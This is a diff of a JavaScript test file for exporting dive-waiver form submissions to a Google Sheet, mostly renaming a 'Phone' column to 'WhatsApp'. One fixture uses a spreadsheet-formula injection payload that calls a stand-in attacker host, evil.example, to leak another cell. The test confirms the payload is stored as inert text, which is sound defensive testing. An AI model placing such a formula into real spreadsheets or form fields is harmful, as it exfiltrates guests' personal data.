@@ -58,7 +58,7 @@ test("kolom spreadsheet: judul unik, satu kolom ID, nilai sebanyak kolom", () =>
   assert.equal(sheetValues(waiver()).length, SHEET_COLUMNS.length);
   for (const c of sheetColumns()) assert.ok(["text", "date", "datetime", "number", "link"].includes(c.type), c.header);
   // Kolom yang sering berisi + atau nol di depan (penyebab #ERROR! di sheet contoh pemilik) bertipe teks.
-  for (const header of ["Phone", "Emergency Contact", "Cert No.", "ID", "Order"]) assert.equal(SHEET_COLUMNS[col(header)].type, "text", header);
+  for (const header of ["WhatsApp", "Emergency Contact", "Cert No.", "ID", "Order"]) assert.equal(SHEET_COLUMNS[col(header)].type, "text", header);
 });
 
 test("satu formulir menjadi satu baris rapi: waktu WIT, tanggal ISO, telepon tetap teks, tautan ke admin", () => {
@@ -68,7 +68,7 @@ test("satu formulir menjadi satu baris rapi: waktu WIT, tanggal ISO, telepon tet
   assert.equal(get("ID"), "DW-261102-ABCDE");
   assert.equal(get("Dive Date"), "2026-11-04");
   assert.equal(get("Date of Birth"), "1990-05-20");
-  assert.equal(get("Phone"), "+62 812 3456 7890");
+  assert.equal(get("WhatsApp"), "+62 812 3456 7890");
   assert.equal(get("Emergency Contact"), "+62 813 1111 2222 (Budi, suami)");
   assert.equal(get("Cert No."), "0012345");
   assert.equal(get("Age"), 36);
@@ -154,14 +154,14 @@ test("Apps Script: membuat lembar rapi, teks tetap teks, kiriman ulang menimpa b
   const table = sheetTable(sheet, width);
   assert.equal(table.length, 3);
   // Telepon yang diawali + tidak menjadi #ERROR! karena format teks dipasang sebelum nilainya.
-  assert.equal(table[2][col("Phone")], "+33 6 77 30 40 50");
+  assert.equal(table[2][col("WhatsApp")], "+33 6 77 30 40 50");
   assert.equal(table[1][col("Emergency Contact")], "+62 813 1111 2222 (Budi, suami)");
   // Isian tamu yang berbentuk rumus ditulis sebagai teks kaya (tidak pernah dijalankan).
   assert.equal(table[2][col("Full Name")], '=IMAGE("https://evil.example/?"&F2)');
   assert.deepEqual(sheet.at(3, col("Full Name") + 1).rich, { text: '=IMAGE("https://evil.example/?"&F2)', link: "" });
-  assert.deepEqual(sheet.at(3, col("Phone") + 1).rich, { text: "+33 6 77 30 40 50", link: "" });
+  assert.deepEqual(sheet.at(3, col("WhatsApp") + 1).rich, { text: "+33 6 77 30 40 50", link: "" });
   assert.equal(sheet.at(2, col("Email") + 1).rich, null, "teks biasa tetap nilai biasa");
-  assert.equal(sheet.at(3, col("Phone") + 1).format, "@");
+  assert.equal(sheet.at(3, col("WhatsApp") + 1).format, "@");
   assert.equal(sheet.at(2, col("Dive Date") + 1).format, "dd mmm yyyy");
   assert.equal(sheet.at(2, col("Timestamp (WIT)") + 1).format, "dd mmm yyyy hh:mm");
   // Tautan formulir, dan kolom medis berwarna untuk yang perlu dokter.
